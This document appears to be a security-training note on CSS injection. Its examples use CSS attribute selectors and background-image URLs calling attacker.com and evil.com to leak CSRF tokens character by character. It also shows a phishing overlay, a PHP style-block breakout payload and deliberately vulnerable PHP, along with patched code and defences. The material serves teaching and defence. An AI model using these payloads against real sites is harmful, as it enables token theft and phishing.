---
tags: [web-exploitation, advanced, vapt]
difficulty: advanced
module: "58 - Advanced Web Techniques"
topic: "58.04 CSS Injection"
---

# CSS Injection

## 1. Executive Summary

CSS Injection is a sophisticated, scriptless client-side vulnerability wherein an attacker introduces arbitrary Cascading Style Sheets (CSS) into a vulnerable web application. Historically dismissed as a low-impact issue capable only of "UI Redressing" or defacement, modern CSS specifications have transformed it into a powerful vector for data exfiltration.

Because CSS operates entirely without JavaScript, it is frequently used by advanced threat actors to bypass stringent Content Security Policies (CSP) that explicitly block inline scripts (`unsafe-inline`). By leveraging CSS Attribute Selectors, custom font ligatures, and background image requests, an attacker can systematically extract sensitive data—such as passwords, CSRF tokens, and personal information—directly from the Document Object Model (DOM), character by character.

## 2. Conceptual Foundation: The Power of Modern CSS

To understand CSS Injection, one must recognize that CSS is not just a styling language; it is a complex rules engine capable of conditional logic and triggering network requests.

### Triggering Network Requests
CSS can force the browser to initiate HTTP `GET` requests using properties like `background-image`, `list-style-image`, or `@import`.
```css
body { background-image: url('http://attacker.com/ping'); }
```

### Conditional Logic via Attribute Selectors
CSS3 introduced advanced attribute selectors that can match elements based on the exact value, or partial value, of their HTML attributes.
- Exact Match: `input[value="secret"]`
- Starts With: `input[value^="sec"]`
- Ends With: `input[value$="ret"]`
- Contains: `input[value*="ecr"]`

When conditional logic is combined with network requests, CSS becomes a keylogger.

## 3. In-Depth Architectural Mechanics (The Keylogger Vector)

The most lethal form of CSS injection is extracting hidden tokens from `<input>` fields.
Suppose an application renders a CSRF token:
`<input type="hidden" name="csrf_token" value="abc123xyz">`

An attacker injects the following CSS:
```css
input[name="csrf_token"][value^="a"] { background: url('http://attacker.com/log?char=a'); }
input[name="csrf_token"][value^="b"] { background: url('http://attacker.com/log?char=b'); }
input[name="csrf_token"][value^="c"] { background: url('http://attacker.com/log?char=c'); }
```

**Execution Flow:**
1. The browser parses the DOM.
2. The browser evaluates the injected CSS rules.
3. It checks if the `value` attribute of the input starts with 'a'. It does! (`abc123xyz`).
4. To apply the style, the browser *must* fetch the background image.
5. An HTTP GET request is sent to `http://attacker.com/log?char=a`.
6. The attacker logs 'a', and dynamically generates a new payload testing `aa`, `ab`, `ac`...

## 4. ASCII Diagram: CSS Data Exfiltration Architecture

```text
   +---------------------------------------------------+
   |  VICTIM BROWSER                                   |
   |                                                   |
   |  <style>                                          |
   |    /* Attacker Payload Generation 1 */            |
   |    input[value^="a"] { background: url(/a); }     |
   |    input[value^="b"] { background: url(/b); }     |
   |  </style>                                         |
   |                                                   |
   |  <input type="hidden" value="b7x9...">            |
   |                                                   |
   |  [ CSS Engine Matches "b" ] ===================== |
   +---------------------------------------------------+ \
                                                          \  HTTP GET /b
                                                           \
                                                            v
                                           +------------------------------------+
                                           | ATTACKER SERVER                    |
                                           | 1. Receives 'b'                    |
                                           | 2. Updates known token: 'b'        |
                                           | 3. Generates Payload Generation 2  |
                                           |    (ba, bb, bc, bd...)             |
                                           +------------------------------------+
                                                           /
   +---------------------------------------------------+  /
   |  VICTIM BROWSER (Reloaded via iframe/meta)        | / HTTP Response
   |                                                   |<
   |  <style>                                          |
   |    /* Attacker Payload Generation 2 */            |
   |    input[value^="b7"] { background: url(/b7); }   |
   |  </style>                                         |
   |                                                   |
   |  [ CSS Engine Matches "b7" ] ==================== | ---> HTTP GET /b7
   +---------------------------------------------------+
```

## 5. Exploitation Scenarios (Beyond Attribute Selectors)

### A. Text Node Exfiltration (Font Ligatures)
Attribute selectors (`value="..."`) cannot read text sitting directly inside a tag (e.g., `<div>SECRET DATA</div>`).
To extract text nodes, attackers use custom fonts. An attacker can load an external font via `@font-face` where a specific sequence of characters (a ligature, like "SEC") is defined to be astronomically wide (e.g., 9000px).
When the browser renders the text, if it contains "SEC", the massive width triggers a horizontal scrollbar. The attacker uses CSS scrollbar pseudo-selectors (`::-webkit-scrollbar:horizontal`) to trigger a background image request, confirming the presence of the text.

### B. UI Redressing and Phishing
Attackers can completely rewrite the visual structure of a page to trick users into submitting data to the wrong endpoint.
```css
/* Hide legitimate login form */
#legit-form { display: none !important; }

/* Display attacker overlay */
body::after {
  content: "Session Expired. Please login at http://evil.com/login";
  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
  background: white; z-index: 9999;
}
```

### C. Timing Attacks via `@import`
Because CSS blocks rendering until imported stylesheets are loaded, attackers can use chained `@import` rules on their malicious server to delay page load based on certain conditions, allowing them to extract boolean states via timing analysis.

## 6. Automating the Attack (Tooling)

CSS exfiltration requires rapid iteration. The victim's browser must continuously evaluate new CSS as the attacker discovers the token character by character.
This is achieved by loading the vulnerable page inside an attacker-controlled `<iframe>`. The parent frame continuously reloads the iframe with the updated payload.

**Popular Tools:**
- **Sikula:** A framework designed specifically for CSS-based data exfiltration.
- **CSS-Exfil-Smuggler:** Automates the creation of the CSS payloads and handles the server-side receiving and dynamic re-generation of the next character set.

## 7. Deep Dive: Bypassing Content Security Policy (CSP)

A robust CSP is designed to stop XSS, but it often leaves gaps for CSS Injection.
- If `style-src 'unsafe-inline'` is allowed (which is extremely common to support legacy frontend frameworks), CSS Injection is trivial.
- If `img-src *` is allowed, the attacker can exfiltrate data via background images.
- If `img-src` is restricted, attackers can use CSS to force requests via `@import url(...)` if `style-src` allows arbitrary domains, or they can use `<link rel="prefetch">` mechanics if supported by the browser.
- **CSP Level 3 Mitigation:** The best defense is `style-src 'self'`, completely disallowing inline styles and external stylesheets.

## 8. Source Code Analysis: Vulnerable vs Patched

### Vulnerable Code (PHP Custom Theming)
```php
<?php
  // Application allows users to pass a custom theme color via URL
  $color = $_GET['theme_color'];
  // Developer blocks script tags, assuming CSS is safe
  $color = str_replace("<script>", "", $color);
?>
<html>
<head>
  <style>
    body { background-color: <?php echo $color; ?>; }
  </style>
</head>
<body>
  <input type="hidden" name="csrf" value="SUPER_SECRET_TOKEN">
</body>
</html>
```
Attacker Payload: `white; } input[value^="S"] { background: url('http://evil.com/S'); } /*`

### Patched Code (Strict Validation)
```php
<?php
  $color = $_GET['theme_color'];
  
  // Defense: Use a strict Regex allow-list for CSS values
  if (!preg_match('/^[a-zA-Z0-9#]+$/', $color)) {
      $color = 'white'; // Fallback to default
  }
?>
```

## 9. Defensive Posture and Remediation

1. **Context-Aware Encoding:** Never reflect raw user input directly inside a `<style>` block or a `style="..."` attribute. If dynamic styling is required, strictly validate the input against an allow-list (e.g., verifying it is a valid hex code or a predefined CSS class name).
2. **Eliminate Unsafe Inline Styles:** Implement a strict Content Security Policy that removes `unsafe-inline` from the `style-src` directive. This forces the application to load CSS exclusively from trusted, external `.css` files.
3. **Restrict Image Sources:** Configure the `img-src` CSP directive to only allow images from `'self'` or trusted CDNs. This neutralizes the ability for CSS to exfiltrate data via `background-image` tracking pixels.
4. **DOM Design:** Avoid placing highly sensitive data (like API keys or session-equivalent CSRF tokens) in DOM attributes (like `value`). Instead, store them in JavaScript variables that are not exposed to CSS attribute selectors, or fetch them asynchronously via XHR/Fetch after the DOM has rendered.

## 10. Chaining Opportunities

- **CSS Injection + CSRF:** Utilizing CSS to silently steal the target's anti-CSRF token, and then immediately using it to execute a state-changing Cross-Site Request Forgery attack.
- **CSS Injection + Clickjacking:** Using CSS to make the legitimate page transparent and reposition critical buttons (like "Transfer Funds") directly under the victim's cursor.
- **CSS Injection + CSP Bypass:** Acting as the primary payload when strict CSP policies make JavaScript-based XSS impossible.

## 11. Related Notes

- [[07 - Cross-Site Scripting (XSS)]]
- [[03 - Dangling Markup Injection]]
- [[12 - Content Security Policy (CSP) Bypasses]]
- [[08 - Cross-Site Request Forgery (CSRF)]]
- [[15 - Client-Side Security Controls]]
